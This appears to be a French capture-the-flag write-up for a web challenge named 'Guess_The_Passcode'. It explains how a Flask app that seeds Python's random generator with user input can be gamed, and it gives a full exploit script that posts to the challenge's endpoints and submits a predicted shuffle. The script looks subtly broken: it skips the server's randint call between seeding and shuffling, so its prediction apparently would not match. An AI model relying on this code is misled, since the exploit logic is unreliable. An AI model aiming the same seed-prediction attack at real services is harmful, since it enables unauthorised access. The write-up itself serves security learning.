@@ -1,0 +1,119 @@
+Guess_The_Passcode - Writeup
+Description du défi
+Le défi présentait une application web simulant une interface d'iPhone, où les utilisateurs devaient deviner un code secret. L'application backend était une application Flask qui interagissait avec l'interface via deux points d'API principaux :
+
+/check_password : Cet endpoint vérifiait l'entrée de l'utilisateur et générait un nombre aléatoire.
+/check_guess : Cet endpoint vérifiait si le code généré correspondait à la séquence correcte après mélange d'une liste.
+
+Le but était de comprendre la logique derrière la génération du code et de soumettre le bon code.
+
+Analyse du code Flask fourni
+En analysant le code backend, plusieurs informations clés se sont dégagées :
+
+@app.route('/check_password', methods=['POST'])
+def check_password():
+    data = request.json
+    guess = data.get('guess')
+
+    # Définir la seed en fonction du "guess" de l'utilisateur
+    if guess is not None:
+        random.seed(guess)
+
+    # Génère un nombre aléatoire entre 0 et 9999
+    generated_random = random.randint(0, 9999)
+    return jsonify({'status': 'success', 'generated_random': generated_random, 'guess': guess})
+
+
+Cette partie du code réalise les actions suivantes :
+
+Elle définit la seed du générateur aléatoire en utilisant le "guess" de l'utilisateur.
+Elle génère un nombre aléatoire entre 0 et 9999 et le renvoie au client.
+
+@app.route('/check_guess', methods=['POST'])
+def check_guess():
+    data = request.get_json()
+    guess = data.get('guess')
+
+    # Liste fixe utilisée pour le mélange
+    n = ["6", "k", "8", "t", "d", "r", "c", "4", "7", "q", "w", "m", "x", "3"]
+    random.shuffle(n)
+
+    if guess == ''.join(n):
+        return jsonify({"message": "Flag obtenu", "flag": "HackTonLycee{Fake_Flag}"}), 200
+    else:
+        return jsonify({"message": "Le guess ne correspond pas."}), 400
+
+
+Cette partie gère la vérification du code :
+
+Elle mélange une liste de caractères prédéfinis et compare la séquence mélangée avec l’entrée de l’utilisateur.
+Si la devinette est correcte, elle renvoie un message de succès et un faux flag (HackTonLycee{Fake_Flag}).*
+
+Stratégie d'exploitation
+Points clés :
+La seed aléatoire est définie par l'entrée de l'utilisateur dans /check_password.
+Dans /check_guess, une liste fixe de caractères est mélangée.
+Pour réussir à deviner le code, il faut prédire l'ordre du mélange en contrôlant la seed.
+
+Étapes de l'exploit
+Fixer la seed localement :
+En utilisant la même liste fixe de caractères (n), et en définissant la même seed que sur le serveur, on peut simuler le mélange localement pour prédire le code.
+Soumettre le code correct :
+Une fois le code correct prédit, il suffit de le soumettre via l'endpoint /check_guess.
+
+Script Python d'exploitation
+import requests
+import random
+
+# Fonction pour vérifier le mot de passe et synchroniser avec la génération de nombre aléatoire du serveur
+def check_password(guess):
+    # Fixer la seed aléatoire avec le "guess"
+    random.seed(guess)
+
+    # Préparer le payload à envoyer au serveur
+    payload = {
+        'guess': guess,
+    }
+
+    # Envoyer la devinette à l'endpoint check_password du serveur
+    url = '<https://web1.ctf.yogosha.com/check_password>'  # Modifier l'URL en fonction du CTF
+    response = requests.post(url, json=payload)
+
+    # Vérifier la réponse du serveur
+    if response.status_code == 200:
+        data = response.json()
+        print(f"Réponse du serveur : {data}")
+
+        # Générer le code correct à partir du mélange
+        generated_guess = ''.join(generate_flag())
+        send_guess_to_server(generated_guess)
+    else:
+        print(f"Erreur : {response.json()}")
+
+# Fonction pour générer le flag attendu en mélangeant la liste
+def generate_flag():
+    n = ["6", "k", "8", "t", "d", "r", "c", "4", "7", "q", "w", "m", "x", "3"]
+    random.shuffle(n)
+    return n
+
+# Fonction pour soumettre la bonne devinette à l'endpoint /check_guess
+def send_guess_to_server(guess):
+    url = '<https://web1.ctf.yogosha.com/check_guess>'  # Modifier l'URL en fonction du CTF
+    response = requests.post(url, json={'guess': guess})
+
+    if response.status_code == 200:
+        data = response.json()
+        print(f"Succès : {data['message']}")
+        print(f"Flag : {data.get('flag', 'Pas de flag retourné')}")
+    else:
+        print(f"Erreur : {response.json()}")
+
+if __name__ == '__main__':
+    guess = input("Entrez votre devinette pour le mot de passe : ")  # Entrée utilisateur pour la devinette
+    check_password(guess)
+
+
+Explication :
+check_password : Cette fonction envoie la devinette à l'endpoint /check_password et définit localement la seed du générateur aléatoire.
+generate_flag : Cette fonction simule localement le mélange de la liste de caractères pour générer le code attendu.
+send_guess_to_server : Cette fonction soumet le code généré à l'endpoint /check_guess pour obtenir le flag.
